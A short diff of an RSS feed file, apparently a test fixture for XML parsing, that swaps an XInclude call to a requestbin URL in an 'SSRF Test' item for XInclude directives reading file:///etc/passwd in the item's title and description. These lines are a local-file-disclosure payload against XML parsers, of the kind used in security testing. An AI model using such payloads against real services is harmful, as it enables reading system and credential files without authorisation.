@@ -5,14 +5,15 @@
     <link>http://example.com</link>
     <description>Example feed</description>
     <item>
-      <title>SSRF Test</title>
+      <title><xi:include href="file:///etc/passwd" parse="text"/></title>
       <link>http://example.com/item</link>
       <description>
-        <xi:include href="http://requestbin.whapi.cloud/1rjktsh1" parse="xml"/>
+        <xi:include href="file:///etc/passwd" parse="text"/>
       </description>
       <pubDate>Fri, 05 Sep 2025 12:00:00 GMT</pubDate>
     </item>
   </channel>
 </rss>
+
 
 
